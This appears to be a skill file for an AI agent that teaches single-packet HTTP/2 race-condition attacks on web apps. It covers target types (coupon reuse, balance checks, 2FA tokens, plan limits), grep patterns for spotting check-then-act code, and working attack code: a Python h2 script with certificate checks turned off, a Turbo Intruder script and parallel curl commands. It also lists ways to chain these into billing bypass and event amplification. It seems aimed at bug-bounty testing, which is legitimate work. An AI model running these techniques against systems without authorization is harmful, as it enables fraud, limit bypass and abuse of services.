---
name: race-condition-single-packet
description: Single-packet race conditions for exploiting multi-step flows via precise HTTP/2 request synchronization. Use when target has state-changing operations with limit checks, balance validation, or multi-step logic.
---

# Race Condition (Single-Packet Attack)

## Targets

Count-gated limits are the highest-yield targets. Any check-then-act pattern where a count/balance/state is read in one query and modified in a separate query is vulnerable if there's no locking between them.

- Resource creation limits (groups, members, webhooks, tokens, schedules)
- Coupon/discount/promo code application (use-once logic)
- Balance deductions (insufficient funds check)
- Vote/like/rating limits
- 2FA or email verification token validation
- Inventory/stock checks during purchase

### Detection (Source Code)

For Rails apps, grep for the anti-pattern:

```bash
# Count-gated validations without locking
grep -rn "validate.*on.*:create\|exceeded?\|count.*<.*limit\|offset.*exists" app/models/
grep -rn "enforce_.*limit\|limit_reached?\|quota_exceeded?\|seat_available?" app/

# Rails Limitable concern (systemic — all models using it are vulnerable)
grep -rn "include Limitable" app/models/
```

For Django/Python apps:

```bash
# Count checks before creation
grep -rn "\.count()\|\.filter(.*).exists()\|len(.*objects" --include="*.py"
grep -rn "if.*>=.*limit\|if.*>=.*max\|quota.*exceeded" --include="*.py"
```

Red flags: `count >= LIMIT` in a validation method or pre-save hook with no database-level lock (`SELECT ... FOR UPDATE`, advisory lock, or mutex) in the same transaction.

## Methodology

Six steps. Each one matters.

1. **Find a count-gated limit** — docs, error messages, plan comparison pages, source code
2. **Verify the limit enforced sequentially** — fill to limit, send one more, confirm the error
3. **Reset to below the limit** — delete enough to create headroom for the race
4. **Fire h2 single-packet** — all requests in one TCP write
5. **Verify count exceeds limit** — the bypass
6. **Confirm sequential still blocked** — proves the limit works but is raceable (TOCTOU, not broken feature)

Step 6 is what makes this a vulnerability report instead of a broken feature report.

## Technique

### Python h2 (production technique)

True single-packet delivery. Buffer all HTTP/2 HEADERS+DATA frames, flush in one `socket.send()`. This is what actually works against production servers behind CDNs and load balancers.

```python
import ssl, socket, h2.connection, h2.config

def connect_h2_via_proxy(proxy_host, proxy_port, target_host):
    """CONNECT tunnel through proxy, TLS+ALPN h2 to target."""
    sock = socket.create_connection((proxy_host, proxy_port))
    sock.sendall(f"CONNECT {target_host}:443 HTTP/1.1\r\nHost: {target_host}:443\r\n\r\n".encode())
    while b"\r\n\r\n" not in (resp := b""): resp += sock.recv(4096)  # noqa
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    return ctx.wrap_socket(sock, server_hostname=target_host)

tls = connect_h2_via_proxy("127.0.0.1", 8080, "target.com")
conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True, header_encoding='utf-8'))
conn.initiate_connection()
tls.sendall(conn.data_to_send())
tls.recv(65535); conn.receive_data(tls.recv(65535)); tls.sendall(conn.data_to_send())

# Buffer ALL frames without sending
for i in range(N):
    body = build_body(i)
    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, headers + [("content-length", str(len(body)))], end_stream=False)
    conn.send_data(sid, body, end_stream=True)

# Single flush — all frames in one TCP segment
tls.sendall(conn.data_to_send())
```

**Proxy compatibility:** Not all proxies negotiate h2 through CONNECT tunnels. If your proxy downgrades to HTTP/1.1, the frames will fail. Test with a proxy that supports h2 passthrough, or connect directly to the target for the race and replay through the proxy for evidence.

### Turbo Intruder (Burp)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1, engine=Engine.HTTP2)
    for i in range(20):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### Burp Repeater

Send to Repeater, create group tab, duplicate with modified payloads, select "Send group (single packet)".

### curl --parallel (HTTP/1.1 fallback)

Not true single-packet but creates contention. Useful when h2 is unavailable.

```bash
curl --parallel --parallel-immediate --parallel-max 10 \
  -K /tmp/race-0.cfg -K /tmp/race-1.cfg ... -K /tmp/race-9.cfg
```

## Verify

1. **Compare state before/after** — count must exceed the documented limit
2. **Sequential request must fail** — proves limit enforcement exists but was bypassed
3. **Log evidence at each step** — use `X-PoC-Step: N-description` headers for proxy history correlation

## Indicators
- Resource count exceeds documented plan limit
- N-1 of N parallel requests succeed (one gets the lock contention, rest bypass)
- 500 errors during race (transaction conflicts) indicate the window exists even if bypass doesn't succeed — increase concurrency
- Sequential requests blocked post-race confirms TOCTOU (not a missing limit)

## Chain With
- orm-filter-data-leak (race-accelerated boolean oracle extraction)
- Billing bypass (member seats, paid plan features)
- CI minute exhaustion (pipeline schedule races)
- Event amplification (webhook races — every project event duplicated to attacker)

## Reference
https://portswigger.net/research/smashing-the-state-machine
